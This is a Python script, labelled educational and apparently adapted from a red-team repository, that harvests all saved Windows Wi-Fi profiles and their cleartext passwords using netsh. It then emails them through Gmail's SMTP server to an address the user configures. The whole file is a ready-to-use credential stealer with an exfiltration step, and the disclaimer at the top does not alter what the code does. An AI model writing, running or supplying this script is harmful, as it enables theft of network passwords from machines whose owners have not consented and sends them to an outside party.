#THIS IS FOR EDUCATIONAL PURPOSES ONLY!!! created by Bernard Dimero
#referenced from https://github.com/davidbombal/red-python-scripts/blob/main/windows10-wifi.py


import subprocess
import re
import smtplib
from email.message import EmailMessage

# Function to execute a system command and return decoded output, we are defining a command here so it can be easily used again
# for different commands
def run_command(command):
    result = subprocess.run(command, capture_output=True)
    return result.stdout.decode()

# Retrieve all saved Wi-Fi profiles
profiles_output = run_command(["netsh", "wlan", "show", "profiles"])

# Extract Wi-Fi profile names using regex
#\s* means  0 or more white spaces are included
#\r reminds that the regux, will only read up to that point of the sentence etc...
saved_profiles = re.findall(r"All User Profile\s*:\s*(.*)\r", profiles_output)

# Prepare a list to store Wi-Fi details
wifi_credentials = []

# Proceed only IF profiles exist
if saved_profiles:
    for profile in saved_profiles:
        # Dictionary to hold SSID and password
        profile_info = {"ssid": profile}

        # Check if the profile has a security key
        security_info = run_command(["netsh", "wlan", "show", "profile", profile])
        if "Security key           : Absent" in security_info:
            continue

        # Retrieve the profile details with the password (if available)
        password_info = run_command(["netsh", "wlan", "show", "profile", profile, "key=clear"])
        password_match = re.search(r"Key Content\s*:\s*(.*)\r", password_info)

        # Add password if found, else None
        profile_info["password"] = password_match.group(1) if password_match else None

        # Append the profile details to the main list
        wifi_credentials.append(profile_info)

# Output the collected Wi-Fi credentials
for item in wifi_credentials:
    print(item)


#EMAIL CONFIGURATION 
email_sender = 'place_the sender email here'         
email_password = '16 characters'         # App password if 2FA is on
email_receiver = 'place the receiver here'       

# Convert wifi_credentials to a string format for the email
message_body = "\n".join(
    [f"SSID: {wifi['ssid']}, Password: {wifi['password']}" for wifi in wifi_credentials])

# Compose the email
msg = EmailMessage()
msg.set_content(message_body)
msg['Subject'] = 'Wi-Fi Password List (from your Python Script)'
msg['From'] = email_sender
msg['To'] = email_receiver

# Send the email via Gmail SMTP server
with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    smtp.login(email_sender, email_password)
    smtp.send_message(msg)
